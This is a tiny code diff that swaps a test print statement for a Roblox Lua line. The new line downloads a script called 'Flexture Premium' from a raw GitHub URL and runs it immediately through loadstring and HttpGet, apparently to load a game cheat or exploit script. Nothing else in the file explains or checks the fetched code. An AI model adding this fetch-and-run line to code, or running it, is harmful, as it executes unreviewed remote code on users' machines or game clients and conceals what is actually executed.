@@ -1,1 +1,1 @@
-print("test")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Prodgc/Flexture-Premium/refs/heads/main/Flexture%20Premium%20%5BONE%20T%C4%B0ME%5D", true))()
